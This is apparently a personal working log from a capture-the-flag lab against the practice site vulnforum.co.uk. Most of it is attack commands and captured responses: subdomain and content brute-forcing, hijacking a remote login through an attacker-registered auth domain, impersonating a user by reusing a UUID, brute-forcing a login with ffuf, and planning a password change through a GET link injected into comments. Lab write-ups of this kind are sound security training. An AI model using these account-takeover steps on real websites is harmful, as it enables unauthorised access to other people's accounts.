@@ -1,0 +1,82 @@
+Domain: www.vulnforum.co.uk
+Ip: 68.183.255.206
+"Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+server: nginx/1.21.1
+
+get url:
+curl  http://www.vulnforum.co.uk  -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+
+dnsrecon:
+dnsrecon -d vulnforum.co.uk -D ~/wordlist/subdomains.txt -t brt
+//Subdomains found: 
+
+Contents discovery:
+ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/content.txt -u "http://vulnforum.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
+//Subpages found:
+//vulnforum.co.uk/1, vulnforum.co.uk/01, vulnforum.co.uk/css,
+//vulnforum.co.uk/js, vulnforum.co.uk/images, vulnforum.co.uk/login
+//vulnforum.co.uk/out, vulnforum.co.uk/login, vulnforum.co.uk/settings
+
+---------information gathered from web page--------------
+//user: toby
+//MD5 hash: 1ac9c036aaf12a755084dc6a326ed7f5
+//subpage: vulnforum.co.uk/user/#HASH
+
+---------logging in with method=remote-------------------
+curl -X POST -d "username=&password=&method=remote" "http://vulnforum.co.uk/login" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+
+#1 FLAG Found
+{"display_msg":"Server Error","technical_msg":"Server \"http:\/\/jv5iwqxt.auth.vulnforum.co.uk\/auth\" responded with a 404 error","flag":"[^FLAG^D45391B42D080B1938B035A601C657B3^FLAG^]"}     
+
+//at jv5iwqxt.auth.vulnforum.co.uk I'm hitting a wall. 
+//Subdomain discovered: auth.vulnforum.co.uk
+// seems like subdomain is pointing to vulnauth.co.uk
+
+curl  http://vulnauth.co.uk/ -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -v
+
+#2 FLAG FOUND
+[^FLAG^A959EBEC1D9A02A456FC5BCCF7BA8D91^FLAG^]
+
+//Sign up page...
+curl -X POST -d "signup_domain=jv5iwqxt.auth.vulnforum.co.uk&signup_email=tmo@mail.com&signup_password=123456&"  http://vulnauth.co.uk/ -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -v
+
+//Created a vuln account with credentials:
+email: tmo@mail.com
+password: 123456
+
+//Logging into jv5iwqxt.auth.vulnforum.co.uk
+//Creating new user...
+username: 1
+UUID: 1
+password: 1
+
+Response: {"display_msg":"Could not lookup user from remote hash","technical_msg":"local_uuid could not be found on database","flag":"[^FLAG^D45391B42D080B1938B035A601C657B3^FLAG^]"}   
+
+//Creating user with toby's uuid
+username: toby
+UUID: [^FLAG^D45391B42D080B1938B035A601C657B3^FLAG^]
+password: 123
+
+//Logging into the page with credentails:
+username: toby
+password: 123
+//changing mode to remote.
+
+#3 FLAG Found 
+[^FLAG^3B1A170C3033B788FEB1B1A4E45D62CD^FLAG^]
+
+//Successfully logged in.
+
+ffuf -X POST -u "http://vulnforum.co.uk/login" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/numbers.txt -d "user=FUZZ&password=FUZZ&method=local" -H "application/x-www-form-urlencoded:charset=UTF-8" -fr "Invalid Username or Password" -t 1 -p 0.1 -mc all -fc 404 -c -o result
+
+------------------john is admin--------------------------------------------
+
+//Logged as toby we can see that toby has admin priviliges. We need to hack 
+//his account.
+//We no longer can log into auth page.
+//john's uuid: 76887c0378ba2b80f17422fb0c0791c4.
+//Seem's like this change password thing works based on hashes only...
+
+GET /settings/password?password=123456&hash=76887c0378ba2b80f17422fb0c0791c4
+
+//We can inject it into the code using comment section.
